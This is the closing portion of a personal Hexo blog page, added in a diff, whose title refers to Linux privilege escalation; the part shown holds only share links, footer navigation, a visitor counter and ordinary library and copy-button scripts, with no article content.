+  <li><a class="icon" href="mailto:?subject=linux下提权(持续)&body=Check out this article: https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&title=linux下提权(持续)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&name=linux下提权(持续)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hexo.sheep-sys-sudo.top/%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/&t=linux下提权(持续)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2026
+    Sh_eePppp
+  </div>
+
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+      --><li><a href="/">h0me</a></li><!--
+    --><!--
+      --><li><a href="/categories">Categ0r1es</a></li><!--
+    --><!--
+      --><li><a href="/archives/">Artic1es</a></li><!--
+    --><!--
+      --><li><a href="/links/">L1nks</a></li><!--
+    --><!--
+      --><li><a href="/search/">Searh</a></li><!--
+    -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+
+  <!-- 邮箱信息独立出来，靠右下角 -->
+  <div class="footer-contact">
+    如果文章出现错误，可以联系我进行更改，感谢 
+    <a href="mailto:sh_eepppp@qq.com  ：）">sh_eepppp@qq.com</a>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
